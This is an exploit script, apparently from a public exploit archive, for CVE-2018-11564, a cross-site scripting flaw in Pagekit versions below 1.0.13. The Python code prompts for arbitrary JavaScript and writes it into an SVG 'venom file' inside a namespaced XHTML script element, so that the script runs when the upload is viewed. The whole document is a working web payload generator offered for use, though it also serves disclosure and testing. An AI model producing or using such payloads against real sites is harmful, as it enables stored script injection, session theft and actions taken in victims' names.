# Title: Pagekit < 1.0.13 - Cross-Site Scripting Code Generator
# Author : DEEPIN2
# Date: 2018-06-05
# Vendor: Pagekit
# Sotware: https://pagekit.com/
# Version: < 1.0.13
# CVE: 2018-11564
# python3 required

def makesvg(name, code):
	code = '<exploit:script xmlns:exploit="http://www.w3.org/1999/xhtml">' + code + '</exploit:script>'
	f = open(name, 'w+')
	f.write(code)
	f.close


if __name__ == '__main__':
	print('''
  ______     _______     ____   ___  _  ___        _ _ ____   __   _  _   
 / ___\ \   / / ____|   |___ \ / _ \/ |( _ )      / / | ___| / /_ | || |  
| |    \ \ / /|  _| _____ __) | | | | |/ _ \ _____| | |___ \| '_ \| || |_ 
| |___  \ V / | |__|_____/ __/| |_| | | (_) |_____| | |___) | (_) |__   _|
 \____|  \_/  |_____|   |_____|\___/|_|\___/      |_|_|____/ \___/   |_|  
	[*] Author : DEEPIN2(Junseo Lee)''')
	print('[*] enter name without extension, ex) test.svg -> test')
	filename = input('Filename : ') + '.svg'
	print('[*] If you want to use alert(), type "alert("bla..bla..")"')
	scriptcode = input('Script code : ')
	try:
		makesvg(filename, scriptcode)
		print('[+] Successfully make venom file "%s"' %filename)
	except Error as e:
		print(e)